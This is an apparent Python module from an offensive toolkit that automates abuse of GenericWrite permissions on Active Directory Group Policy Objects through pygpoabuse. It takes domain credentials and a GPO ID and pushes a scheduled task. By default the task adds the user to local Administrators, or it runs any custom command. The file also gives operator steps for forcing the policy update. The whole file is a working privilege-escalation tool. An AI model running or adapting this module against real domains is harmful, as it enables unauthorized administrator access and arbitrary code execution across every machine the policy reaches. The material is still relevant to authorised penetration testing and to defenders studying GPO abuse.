"""
GPO Abuse via GenericWrite Permission
Exploits GenericWrite permissions on Group Policy Objects to escalate privileges
Uses pygpoabuse to add users to local Administrators group
"""

from core.module_base import ModuleBase, ModuleType, Platform, find_tool
import os


class GpoAbuse(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "gpo_abuse"
        self.description = "Abuse GenericWrite on GPO to escalate privileges"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.POST
        self.platform = Platform.WINDOWS
        self.tags = ["windows", "ad", "gpo", "privilege escalation", "genericwrite"]
        self.references = [
            "https://github.com/Hackndo/pygpoabuse",
            "https://www.hackingarticles.in/domain-escalation-gpo-abuse/",
            "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces"
        ]

        # Options
        self.register_option("DOMAIN", "Target Active Directory domain", required=True)
        self.register_option("USERNAME", "Username with GenericWrite on GPO", required=True)
        self.register_option("PASSWORD", "User password", required=True)
        self.register_option("DOMAIN_CONTROLLER", "Domain Controller IP/hostname", default=None)
        self.register_option("GPOID", "GPO ID to abuse (e.g., 31B2F340-016D-11D2-945F-00C04FB984F9)", required=True)
        self.register_option("COMMAND", "Command to execute (default: add user to Admins)",
                           default="net localgroup Administrators {USERNAME} /add")
        self.register_option("CUSTOM_COMMAND", "Custom command to execute instead of default", default=None)
        self.register_option("TASKNAME", "Scheduled task name", default="UwU-Task")

    def check(self) -> bool:
        """Check if pygpoabuse is available"""
        # Try to find pygpoabuse.py
        pygpoabuse = find_tool("pygpoabuse.py")
        if pygpoabuse:
            self.print_good(f"Found pygpoabuse: {pygpoabuse}")
            return True

        # Try python module import
        ret, stdout, stderr = self.run_command(
            ["python3", "-c", "import pygpoabuse; print('OK')"],
            timeout=5
        )

        if ret == 0 and 'OK' in stdout:
            self.print_good("pygpoabuse module available")
            return True

        self.print_error("pygpoabuse not found")
        self.print_error("Install with: pip install pygpoabuse")
        self.print_error("Or: git clone https://github.com/Hackndo/pygpoabuse && cd pygpoabuse && pip install .")
        return False

    def run(self) -> bool:
        """Execute GPO abuse"""
        if not self.check():
            return False

        domain = self.get_option("DOMAIN")
        username = self.get_option("USERNAME")
        password = self.get_option("PASSWORD")
        dc = self.get_option("DOMAIN_CONTROLLER")
        gpo_id = self.get_option("GPOID")
        command_template = self.get_option("COMMAND")
        custom_command = self.get_option("CUSTOM_COMMAND")
        taskname = self.get_option("TASKNAME")

        # Determine command to execute
        if custom_command:
            command = custom_command
        else:
            command = command_template.replace("{USERNAME}", username)

        self.print_status("GPO Abuse Configuration:")
        self.print_line(f"  Domain: {domain}")
        self.print_line(f"  Username: {username}")
        self.print_line(f"  GPO ID: {gpo_id}")
        self.print_line(f"  Command: {command}")
        if dc:
            self.print_line(f"  DC: {dc}")
        self.print_line()

        # Find pygpoabuse
        pygpoabuse = find_tool("pygpoabuse.py")

        if not pygpoabuse:
            # Try direct python import
            self.print_status("Using pygpoabuse Python module...")
            pygpoabuse_cmd = ["python3", "-m", "pygpoabuse"]
        else:
            self.print_status(f"Using pygpoabuse: {pygpoabuse}")
            pygpoabuse_cmd = ["python3", pygpoabuse]

        # Build command
        credentials = f"{domain}/{username}:{password}"

        cmd = pygpoabuse_cmd + [
            credentials,
            "-gpo-id", gpo_id,
            "-command", command,
            "-taskname", taskname
        ]

        if dc:
            cmd.extend(["-dc-ip", dc])

        self.print_status("Executing pygpoabuse...")
        self.print_status(f"Command: {' '.join(cmd[:3])} [REDACTED] -gpo-id {gpo_id} ...")
        self.print_line()

        ret, stdout, stderr = self.run_command(cmd, timeout=60)

        # Display output
        if stdout:
            self.print_line(stdout)

        if stderr and 'error' in stderr.lower():
            self.print_error("Errors detected:")
            self.print_line(stderr)

        if ret == 0 or 'success' in stdout.lower() or 'success' in stderr.lower():
            self.print_line()
            self.print_good("=" * 60)
            self.print_good("GPO ABUSE SUCCESSFUL!")
            self.print_good("=" * 60)
            self.print_line()
            self.print_warning("IMPORTANT: Wait 90-120 seconds for GPO to update")
            self.print_warning("Or force update on target with: gpupdate /force")
            self.print_line()
            self.print_good(f"User '{username}' should now be added to Administrators")
            self.print_good("Verify with: net localgroup Administrators")
            return True

        else:
            self.print_error("GPO abuse may have failed")
            self.print_error(f"Return code: {ret}")
            return False


# Module instantiation
module = GpoAbuse()
